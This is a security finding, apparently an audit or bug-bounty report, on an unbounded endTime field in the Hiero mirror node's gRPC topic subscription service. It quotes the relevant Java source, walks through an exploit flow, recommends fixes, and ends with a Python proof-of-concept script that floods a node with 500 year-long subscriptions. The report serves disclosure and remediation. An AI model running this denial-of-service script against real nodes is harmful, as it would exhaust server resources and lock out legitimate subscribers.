### Title
Unbounded `endTime` Allows Unprivileged Users to Hold gRPC Subscriptions Open Indefinitely

### Summary
`TopicMessageFilter` imposes no upper bound on the `endTime` field — it only requires `endTime > startTime`. Because `pastEndTime()` polls with `RepeatSpec.create(..., Long.MAX_VALUE)` at a 30-second fixed delay and only terminates when `TopicContext.isComplete()` returns `true` (which is gated on `endTime + endTimeInterval` being in the past), any unauthenticated caller can set `endTime` to an arbitrarily distant future timestamp and hold a subscription open for years, consuming server threads, scheduler slots, and database polling capacity.

### Finding Description

**Validation gap — `TopicMessageFilter.java` lines 43–51:**

```java
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;   // no upper bound
}

@AssertTrue(message = "Start time must be before the current time")
public boolean isValidStartTime() {
    return startTime <= DomainUtils.now();            // only constrains startTime
}
``` [1](#0-0) 

There is no constraint that `endTime` must be within any reasonable window of the current time.

**Polling loop — `TopicMessageServiceImpl.java` lines 123–131:**

```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();
    }
    return Flux.empty()
            .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                    .withFixedDelay(grpcProperties.getEndTimeInterval()));
}
``` [2](#0-1) 

`Long.MAX_VALUE` repetitions at the default 30-second `endTimeInterval` means the loop can run for an astronomically long time.

**Termination condition — `TopicContext.isComplete()` lines 203–215:**

```java
return Instant.ofEpochSecond(0, filter.getEndTime())
        .plus(grpcProperties.getEndTimeInterval())
        .isBefore(Instant.now());
``` [3](#0-2) 

The subscription only terminates when `endTime + 30 s` is in the past. With `endTime = now + 1 year`, the subscription stays alive for ~1 year.

**Default `endTimeInterval`:** [4](#0-3) 

```java
private Duration endTimeInterval = Duration.ofSeconds(30);
```

**Exploit flow:**
1. Attacker sends a gRPC `subscribeTopic` request with `startTime = now` (passes `isValidStartTime`) and `endTime = now + 31_536_000_000_000_000L` (nanoseconds = 1 year; passes `isValidEndTime` since it is > startTime).
2. `subscribeTopic` creates a `TopicContext`, calls `pastEndTime()`, which starts a `RepeatSpec` loop firing every 30 s.
3. `isComplete()` evaluates `endTime + 30 s < Instant.now()` — false for ~1 year.
4. The live `incomingMessages` path also calls `topicListener.listen(newFilter)`, which in `PollingTopicListener` runs its own `RepeatSpec.times(Long.MAX_VALUE)` DB-polling loop at the configured interval.
5. Each open subscription holds a reactive scheduler slot, a `boundedElastic` thread, and issues periodic DB queries.
6. Attacker opens N concurrent connections; server resources (threads, DB connections, memory) are exhausted.

### Impact Explanation
Each malicious subscription holds at least one `boundedElastic` scheduler thread and issues a DB query every 30 seconds for the lifetime of the subscription. With a 1-year `endTime`, a single attacker opening hundreds of connections can saturate the thread pool and database connection pool, causing legitimate subscribers to be rejected or starved. The `subscriberCount` gauge will reflect the inflation but there is no enforcement mechanism to cap it or evict long-lived connections.

### Likelihood Explanation
The gRPC endpoint is publicly reachable with no authentication required. The exploit requires only a standard gRPC client (e.g., `grpcurl` or the Hedera SDK) and a single crafted request. It is trivially repeatable in a loop. No special privileges, tokens, or on-chain transactions are needed.

### Recommendation
1. **Add a maximum `endTime` horizon** in `TopicMessageFilter.isValidEndTime()`, e.g., reject any `endTime` more than a configurable window (e.g., 1 hour) beyond `DomainUtils.now()`.
2. **Enforce a server-side subscription timeout** independent of `endTime` (e.g., via `Flux.timeout(maxDuration)`).
3. **Cap concurrent subscriptions per source IP** at the gRPC interceptor layer.
4. **Replace `Long.MAX_VALUE` repetitions** in `RepeatSpec.create(...)` with a computed bound derived from `(endTime - now) / endTimeInterval + 1`.

### Proof of Concept
```python
# Using grpcurl or Hedera SDK pseudocode
import grpc
from mirror_node_pb2 import ConsensusTopicQuery, Timestamp
from mirror_node_pb2_grpc import ConsensusServiceStub

channel = grpc.insecure_channel("mirror-node-host:5600")
stub = ConsensusServiceStub(channel)

now_ns = int(time.time() * 1e9)
one_year_ns = now_ns + 365 * 24 * 3600 * int(1e9)

query = ConsensusTopicQuery(
    topicID=...,
    consensusStartTime=Timestamp(seconds=now_ns // int(1e9), nanos=now_ns % int(1e9)),
    consensusEndTime=Timestamp(seconds=one_year_ns // int(1e9), nanos=one_year_ns % int(1e9)),
)

# Open N connections simultaneously
for _ in range(500):
    threading.Thread(target=lambda: list(stub.subscribeTopic(query))).start()

# Server's boundedElastic thread pool and DB connection pool are now exhausted.
# Legitimate subscribers receive errors or indefinite delays.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L43-51)
```java
    @AssertTrue(message = "End time must be after start time")
    public boolean isValidEndTime() {
        return endTime == null || endTime > startTime;
    }

    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L212-214)
```java
            return Instant.ofEpochSecond(0, filter.getEndTime())
                    .plus(grpcProperties.getEndTimeInterval())
                    .isBefore(Instant.now());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L22-22)
```java
    private Duration endTimeInterval = Duration.ofSeconds(30);
```
